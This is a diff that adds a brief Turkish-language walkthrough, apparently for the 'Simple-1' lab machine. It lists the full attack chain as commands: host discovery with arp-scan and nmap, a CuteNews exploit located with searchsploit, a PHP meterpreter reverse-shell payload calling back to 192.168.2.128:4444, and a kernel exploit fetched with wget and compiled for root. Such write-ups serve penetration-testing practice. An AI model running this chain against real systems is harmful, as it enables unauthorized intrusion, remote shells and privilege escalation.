@@ -1,0 +1,11 @@
+SİMPLE-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.117 bulunur.
+2 - nmap -sT -A -p- 192.168.2.117
+3 - searchsploit cutenews, searchsploit -m 37474
+4 - msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.128 LPORT=4444 -f raw
+5 - dirb http://192.168.2.117
+6 - msfconsole, use exploit/multi/handler, set payload php/meterpreter/reverse_tcp
+7 - shell, uname -a, https://www.exploit-db.com/exploits/36746
+8 - cp 36746.c /var/www/html, service apache2 start,
+9 - wget http://192.168.2.128/36746.c
+10 - gcc 36746.c -o root -static
